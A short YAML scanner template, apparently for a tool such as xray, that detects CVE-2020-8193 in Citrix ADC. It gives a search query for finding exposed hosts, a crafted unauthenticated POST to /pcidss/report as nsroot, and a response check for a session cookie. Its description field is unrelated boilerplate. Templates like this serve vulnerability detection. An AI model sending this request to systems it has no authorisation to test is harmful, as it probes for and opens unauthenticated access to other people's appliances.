name: Citrix unauthenticated LFI CVE-2020-8193
manual: true
query: app="citrix-公司产品" || title="Citrix Login" || body="Citrix ADC"
transport: http
set:
  str2: randomLowercase(8)
  str1: randomLowercase(8)
rules:
  r0:
    request:
      method: POST
      path: /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1
      headers:
        Content-Type: application/xml
        X-NITRO-PASS: '{{str1}}'
        X-NITRO-USER: '{{str2}}'
      body: <appfwprofile><login></login></appfwprofile>
    expression: response.status == 406 && response.raw_header.bcontains(b"SESSID=")
expression: r0()
detail:
  links:
  - https://github.com/jas502n/CVE-2020-8193
  - http://packetstormsecurity.com/files/160047/Citrix-ADC-NetScaler-Local-File-Inclusion.html
  description: Citrix is committed to our strong cybersecurity posture to protect
    our customers, partners, and employees.
  tags: Unauthorized
